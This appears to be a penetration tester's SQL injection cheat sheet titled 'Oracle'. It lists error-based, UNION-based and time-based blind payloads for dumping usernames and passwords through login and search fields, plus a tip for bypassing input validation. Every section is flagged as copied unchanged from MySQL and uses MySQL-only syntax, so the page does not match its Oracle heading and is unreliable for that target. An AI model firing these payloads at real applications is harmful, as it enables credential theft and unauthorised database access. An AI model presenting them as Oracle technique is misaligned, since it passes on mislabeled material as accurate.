# Oracle

## Methodology

See [0 SQL Injection](0%20SQL%20Injection.md) for identification if necessary

### Error-based Payloads vs Authentication Queries !!UNMODIFIED FROM MySQL!!

We can first attempt to dump information in an error response. This is particularly useful against authentication against authenticaton queries as a valid/invalid response will not display table information.

```mysql
# We can first attempt to view version information inside the error response
' OR 1=1 in (select @@version) -- //
'
# We can now attempt to dump table information
' OR 1=1 in (SELECT * FROM users) -- //
'
# In the case where we can only query one column at a time
' OR 1=1 in (SELECT password FROM users) -- //
'
# We can now specify a user to dump the password for
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
'
```

### UNION-based payloads vs Search Queries !!UNMODIFIED FROM MySQL!!

We can use `ORDER BY` and `UNION SELECT` in a search field to visualize and enumerate a database with many columns.

```mysql
# We first use ORDER BY and increment until we receive an error
' ORDER BY 1 -- //
' ORDER BY 1,2 -- //
' ORDER BY 1,2,3 -- //
' ORDER BY 1,2,3,4 -- //
' ORDER BY 1,2,3,4,5 -- //
' ORDER BY 1,2,3,4,5,6 -- //
# We now get the error "Unknown column '6' in 'order clause'" so we know the database has 6 columns

# We can use UNION SELECT to return database information in each column
' UNION SELECT database(), user(), @@version, null, null -- //
'
# In the case where the first 2 columns are not being returned (reserved or whatever), we can rearange our statement to actually view the values
' UNION SELECT null, database(), user(), @@version, null -- //
'
# We can now attempt to retrieve the columns table from the information_schema database belonging to the current database. We'll then store the output in the second, third, and fourth columns, leaving the first and fifth columns null
' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //
'
# Now that we have identified our table names, column names, and database name, we can attempt to dump sensitive information a table
' UNION SELECT null, username, password, description, null FROM users -- //
'
# We can also identify other databases to enumerate
' UNION SELECT null, SCHEMA_NAME, null, null, null FROM information_schema.schemata -- //
'
```

**Note:** We can also add a `%` before the single quote to bypass input validation

### Blind SQL Injections !!UNMODIFIED FROM MySQL!!

Used in the case where database responses are never returned and behavior is inferred using either boolean or time-based logic.

```mysql
# Time based identification (value before ' must be exist for sleep to succeed, allowing us to identify existing values)
' AND IF (1=1, sleep(2),'false') -- //
'
```
